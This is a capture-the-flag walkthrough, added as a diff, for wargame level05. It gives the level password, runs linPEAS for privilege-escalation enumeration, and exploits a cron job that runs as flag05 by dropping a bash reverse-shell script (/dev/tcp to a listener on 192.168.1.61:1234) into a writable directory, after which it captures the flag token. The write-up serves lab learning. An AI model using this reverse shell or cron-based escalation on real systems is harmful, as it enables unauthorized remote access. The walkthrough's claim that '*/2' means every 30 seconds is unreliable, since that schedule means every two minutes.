@@ -1,0 +1,48 @@
+login/pw:
+	level05 : ne2searoevaevoem4ov4ar8ap
+
+linpeas.sh:
+	wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
+	scp -P 4242 linpeas.sh level05@[IP]:/tmp/linpeas.sh
+	chmod 755 /tmp/linpeas.sh
+	bash /tmp/linpeas.sh
+		=> /var/mail/level05
+		=> /var/spool/mail/level05
+	
+RESOLUTION:
+	ls -l /var/mail
+		=> -rw-r--r--+ 1 root mail 58 Oct 20 09:49 level05
+	getfacl /var/mail/level05
+		=> user:flag05:r--
+	cat /var/mail/level05
+		=> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+			=> looks like a cron job run as flag05 within a mail directory, this is unusual
+	ls -l /usr/sbin/openarenaserver
+		=> -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+	getfacl /usr/sbin/openarenaserver
+		=> user:level05:r--
+			=> Lets read then
+	file /usr/sbin/openarenaserver
+		=> /usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
+	cat /usr/sbin/openarenaserver
+		=> for i in /opt/openarenaserver/* ; do
+				(ulimit -t 5; bash -x "$i")
+				rm -f "$i"
+	ls -l /opt/openarenaserver
+		=> drwxrwxr-x+ 2 root root 40 Oct 20 16:46 openarenaserver
+	getfacl /opt/openarenaserver
+		=> user:level05:rwx
+	Lets sum up:
+		A cron job run as flag05 that executes everything in /opt/openarenaserver
+		We have write permission in /opt/openarenaserver
+			=> Free win
+	Host:
+		nc -lvp 1234
+		ifconfig
+			=> ip = 192.168.1.61
+	Remote:
+		echo 'bash -i >& /dev/tcp/192.168.1.61/1234 0>&1' > /opt/openarenaserver/reverse_shell.sh
+	Let's wait 30 sec as the cron job is run every 30 sec (*/2)
+	getflag
+		=> Check flag.Here is your token : viuaaale9huek52boumoomioc	
+
